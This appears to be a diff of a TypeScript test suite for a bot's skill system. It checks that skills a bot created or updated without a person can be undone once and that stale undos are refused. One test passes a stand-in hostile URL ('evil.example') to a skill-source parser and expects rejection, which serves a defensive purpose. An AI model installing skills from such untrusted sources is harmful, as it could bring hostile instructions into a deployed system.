+      action: "update",
+      previous: { skillMd: previous, source, references: [] },
+    })).toEqual({ undone: true });
+    expect(readSkillFile(bot, "file-expense")).toBe(previous);
+    expect(readSkillReferences(bot, "file-expense")).toEqual([]);
+    expect(listSkills(bot)[0]).toMatchObject({ enabled: true });
+  });
+});
+
 describe("parseSkillSource", () => {
   it("accepts the shapes users paste", () => {
     expect(parseSkillSource("obra/superpowers")).toMatchObject({ owner: "obra", repo: "superpowers" });
@@ -1074,5 +1491,46 @@ describe("parseSkillSource", () => {
     expect("error" in parseSkillSource("https://evil.example/skill.md")).toBe(true);
     expect("error" in parseSkillSource("")).toBe(true);
     expect("error" in parseSkillSource("https://skills.sh/only-an-owner")).toBe(true);
+  });
+});
+
+describe("undo of a skill a bot wrote without a person", () => {
+  const write = (action: "create" | "update", instructions: string) => {
+    const staged = stageSkillWrite(bot, {
+      action,
+      ...(action === "update" ? { targetName: "own-skill" } : {}),
+      files: [{ path: "SKILL.md", content: SKILL("own-skill", instructions) }],
+    });
+    if ("error" in staged) throw new Error(staged.error);
+    const previous = action === "update" ? readSkillFile(bot, "own-skill") : null;
+    const source = listSkills(bot).find((skill) => skill.name === "own-skill")?.source;
+    const applied = applySkillWriteWithReceipt(bot, staged, () => {});
+    if ("error" in applied) throw new Error(applied.error);
+    return { stagedId: staged.id, name: "own-skill", action, ...(previous && source ? { previous: { skillMd: previous, source } } : {}) };
+  };
+
+  it("removes a created skill, once", () => {
+    const created = write("create", "First version.");
+    expect(undoSkillWrite(bot, created)).toEqual({ undone: true });
+    expect(listSkills(bot).some((skill) => skill.name === "own-skill")).toBe(false);
+    expect(undoSkillWrite(bot, created)).toEqual({ stale: true });
+  });
+
+  it("puts an updated skill's previous SKILL.md back while it is unchanged since", () => {
+    write("create", "First version.");
+    const original = readSkillFile(bot, "own-skill");
+    const updated = write("update", "Second version.");
+    expect(undoSkillWrite(bot, updated)).toEqual({ undone: true });
+    expect(readSkillFile(bot, "own-skill")).toBe(original);
+    expect(listSkills(bot).find((skill) => skill.name === "own-skill")).toMatchObject({ enabled: true, description: "First version." });
+    expect(listStagedSkillWrites(bot)).toEqual([]);
+    expect(undoSkillWrite(bot, updated)).toEqual({ stale: true });
+  });
+
+  it("refuses a create's Undo once the skill was updated since", () => {
+    const created = write("create", "First version.");
+    write("update", "Second version.");
+    expect(undoSkillWrite(bot, created)).toEqual({ stale: true });
+    expect(readSkillFile(bot, "own-skill")).toContain("Second version.");
   });
 });
